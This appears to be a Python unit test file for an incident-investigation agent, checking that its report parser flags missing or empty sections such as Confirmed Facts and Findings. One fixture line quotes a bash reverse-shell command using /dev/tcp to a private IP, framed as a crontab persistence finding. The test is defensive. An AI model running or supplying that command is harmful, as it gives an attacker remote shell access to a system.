"""
Offline test: syntactic validation of the investigation per-task report.

The report's ## Confirmed Facts section is the only place grounded findings (e.g.
a reverse shell seen in a SIEM tool result) are recorded, so a malformed report
silently loses evidence. _missing_summary_sections() flags absent/empty sections
so the assess node can nudge the model to re-emit.

Run from project root with:
    python -m pytest tests/unit/test_summary_format_guard.py
"""
from __future__ import annotations

import os
import sys
import unittest

project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, project_root)

from agent.runtime.graph.parsing import _missing_summary_sections


WELL_FORMED = """
## Confirmed Facts
- Event evt-1 added `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1` to crontab.

## Findings
- A reverse shell was established to 10.0.2.5:5555.

## Hypotheses
- [open] The cron entry provides persistence.

## New Leads
- Investigate the C2 host 10.0.2.5.
"""


class SummaryFormatGuardTests(unittest.TestCase):
    def test_well_formed_report_has_no_missing_sections(self):
        self.assertEqual(_missing_summary_sections(WELL_FORMED), [])

    def test_missing_confirmed_facts_is_flagged(self):
        text = WELL_FORMED.replace("## Confirmed Facts", "## Notes")
        self.assertIn("Confirmed Facts", _missing_summary_sections(text))

    def test_empty_section_is_flagged(self):
        # Header present but no bullet underneath.
        text = (
            "## Confirmed Facts\n\n"
            "## Findings\n- found something\n\n"
            "## Hypotheses\n- [open] maybe\n\n"
            "## New Leads\n- a lead\n"
        )
        self.assertEqual(_missing_summary_sections(text), ["Confirmed Facts"])

    def test_none_bullet_satisfies_section(self):
        text = (
            "## Confirmed Facts\n- Event evt-1 reverse shell.\n\n"
            "## Findings\n- compromise.\n\n"
            "## Hypotheses\n- None.\n\n"
            "## New Leads\n- None.\n"
        )
        self.assertEqual(_missing_summary_sections(text), [])

    def test_bold_and_h3_header_variants_accepted(self):
        text = (
            "### Confirmed Facts\n- evt-1.\n\n"
            "**Findings**\n- x.\n\n"
            "### Hypotheses\n- None.\n\n"
            "### New Leads\n- None.\n"
        )
        self.assertEqual(_missing_summary_sections(text), [])

    def test_completely_unstructured_report_flags_all_four(self):
        missing = _missing_summary_sections("The investigation found a reverse shell.")
        self.assertEqual(
            set(missing), {"Confirmed Facts", "Findings", "Hypotheses", "New Leads"}
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
